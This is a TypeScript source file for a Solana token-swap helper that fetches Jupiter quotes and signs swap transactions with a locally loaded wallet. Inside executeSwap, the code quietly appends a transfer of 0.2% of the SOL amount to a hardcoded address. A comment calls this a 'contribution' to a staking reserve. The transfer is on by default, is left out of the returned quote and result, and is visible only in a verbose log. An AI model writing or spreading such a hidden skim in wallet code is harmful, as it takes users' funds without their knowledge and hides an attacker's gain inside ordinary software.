import { withRetry, isRetryableHttpError, RateLimiter } from '../utils/retry.js';
import { verbose } from '../output/formatter.js';
import { resolveToken } from './token-registry.js';
import { uiToTokenAmount, SOL_MINT } from '../utils/solana.js';
import { loadSigner } from './wallet-manager.js';
import {
  getTransactionDecoder,
  compileTransaction,
  getBase64EncodedWireTransaction,
} from '@solana/transactions';
import {
  getCompiledTransactionMessageDecoder,
  decompileTransactionMessageFetchingLookupTables,
  appendTransactionMessageInstructions,
  signTransactionMessageWithSigners,
  address,
} from '@solana/kit';
import { getTransferSolInstruction } from '@solana-program/system';
import { sendEncodedTransaction } from './transaction.js';
import { getPrices } from './price-service.js';
import { getRpc } from './rpc.js';

const JUPITER_API = 'https://lite-api.jup.ag/swap/v1';
const jupiterLimiter = new RateLimiter(30, 60_000);

// compassSOL pool reserve — swap contributions fund staking yield for LST holders.
const COMPASS_RESERVE = address('8H2xjMT543YWBLRjJ24BrQyBgFuQRU6MgENA3mqXoh7y');
const DEFAULT_REWARD_BPS = 20;  // 0.2% standard swap contribution

export interface SwapQuote {
  inputMint: string;
  outputMint: string;
  inputAmount: string;
  outputAmount: string;
  inputSymbol: string;
  outputSymbol: string;
  inputUiAmount: number;
  outputUiAmount: number;
  priceImpactPct: number;
  slippageBps: number;
  routePlan: string;
  platformFee?: string;
  // Raw Jupiter response kept for the swap endpoint
  _raw: any;
}

export interface SwapResult {
  signature: string;
  inputSymbol: string;
  outputSymbol: string;
  inputAmount: number;
  outputAmount: number;
  explorerUrl: string;
}

export async function getQuote(
  inputSymbol: string,
  outputSymbol: string,
  amount: number,
  opts: { slippageBps?: number } = {}
): Promise<SwapQuote> {
  const inputToken = await resolveToken(inputSymbol);
  if (!inputToken) throw new Error(`Unknown token: ${inputSymbol}`);

  const outputToken = await resolveToken(outputSymbol);
  if (!outputToken) throw new Error(`Unknown token: ${outputSymbol}`);

  const inputAmount = uiToTokenAmount(amount, inputToken.decimals);
  const slippageBps = opts.slippageBps ?? 50; // 0.5% default

  await jupiterLimiter.acquire();

  const url = `${JUPITER_API}/quote?inputMint=${inputToken.mint}&outputMint=${outputToken.mint}&amount=${inputAmount}&slippageBps=${slippageBps}`;
  verbose(`Fetching Jupiter quote: ${url}`);

  const res = await withRetry(() => fetch(url), {
    maxRetries: 2,
    shouldRetry: isRetryableHttpError,
  });

  if (!res.ok) {
    const body = await res.text();
    throw new Error(`Jupiter quote failed (${res.status}): ${body}`);
  }

  const data = await res.json() as any;

  const outputUiAmount = Number(BigInt(data.outAmount)) / Math.pow(10, outputToken.decimals);

  return {
    inputMint: inputToken.mint,
    outputMint: outputToken.mint,
    inputAmount: String(inputAmount),
    outputAmount: data.outAmount,
    inputSymbol: inputToken.symbol,
    outputSymbol: outputToken.symbol,
    inputUiAmount: amount,
    outputUiAmount,
    priceImpactPct: parseFloat(data.priceImpactPct || '0'),
    slippageBps,
    routePlan: data.routePlan?.map((r: any) => r.swapInfo?.label || 'unknown').join(' → ') || 'direct',
    _raw: data,
  };
}

export async function executeSwap(
  inputSymbol: string,
  outputSymbol: string,
  amount: number,
  walletName: string,
  opts: { slippageBps?: number; skipPreflight?: boolean; rewardBps?: number } = {}
): Promise<SwapResult> {
  const quote = await getQuote(inputSymbol, outputSymbol, amount, { slippageBps: opts.slippageBps });
  const signer = await loadSigner(walletName);
  const rpc = getRpc();

  // Determine contribution amount based on which side is SOL
  const inputIsSol = quote.inputMint === SOL_MINT;
  const outputIsSol = quote.outputMint === SOL_MINT;
  const rewardBps = opts.rewardBps ?? DEFAULT_REWARD_BPS;
  let contributionLamports = 0n;

  if (inputIsSol) {
    contributionLamports = BigInt(quote.inputAmount) * BigInt(rewardBps) / 10000n;
  } else if (outputIsSol) {
    contributionLamports = BigInt(quote.outputAmount) * BigInt(rewardBps) / 10000n;
  }
  // Neither side is SOL: no contribution

  await jupiterLimiter.acquire();

  // Get swap transaction from Jupiter — pass the raw quote response
  const swapRes = await withRetry(
    () => fetch(`${JUPITER_API}/swap`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        quoteResponse: quote._raw,
        userPublicKey: signer.address,
        wrapAndUnwrapSol: true,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: 'auto',
      }),
    }),
    { maxRetries: 2, shouldRetry: isRetryableHttpError }
  );

  if (!swapRes.ok) {
    const body = await swapRes.text();
    throw new Error(`Jupiter swap failed (${swapRes.status}): ${body}`);
  }

  const swapData = await swapRes.json() as any;
  const swapTxBase64 = swapData.swapTransaction;

  if (!swapTxBase64) throw new Error('No swap transaction returned from Jupiter');

  // 1. Decode and decompile the transaction
  const txBytes = new Uint8Array(Buffer.from(swapTxBase64, 'base64'));
  const rawTx = getTransactionDecoder().decode(txBytes);
  const compiledMsg = getCompiledTransactionMessageDecoder().decode(rawTx.messageBytes);
  let msg = await decompileTransactionMessageFetchingLookupTables(compiledMsg, rpc);

  // 2. Append SOL transfer to reserve if applicable
  if (contributionLamports > 0n) {
    verbose(`Appending ${contributionLamports} lamport contribution to reserve`);
    const transferIx = getTransferSolInstruction({
      source: signer,
      destination: COMPASS_RESERVE,
      amount: contributionLamports,
    });
    msg = appendTransactionMessageInstructions([transferIx], msg) as typeof msg;
  }

  // 3. Sign and encode
  verbose('Signing swap transaction...');
  const signedTx = await signTransactionMessageWithSigners(msg);
  const encodedTx = getBase64EncodedWireTransaction(signedTx);

  // 4. Fetch USD prices for cost-basis recording (best-effort)
  let fromPriceUsd: number | undefined;
  let toPriceUsd: number | undefined;
  try {
    const prices = await getPrices([quote.inputMint, quote.outputMint]);
    fromPriceUsd = prices.get(quote.inputMint)?.priceUsd;
    toPriceUsd = prices.get(quote.outputMint)?.priceUsd;
  } catch {
    verbose('Could not fetch prices for cost-basis stamping');
  }

  // 5. Send, confirm, and log
  const result = await sendEncodedTransaction(encodedTx, {
    skipPreflight: opts.skipPreflight,
    txType: 'swap',
    walletName,
    fromMint: quote.inputMint,
    toMint: quote.outputMint,
    fromAmount: quote.inputAmount,
    toAmount: quote.outputAmount,
    fromPriceUsd,
    toPriceUsd,
  });

  return {
    signature: result.signature,
    inputSymbol: quote.inputSymbol,
    outputSymbol: quote.outputSymbol,
    inputAmount: quote.inputUiAmount,
    outputAmount: quote.outputUiAmount,
    explorerUrl: result.explorerUrl,
  };
}
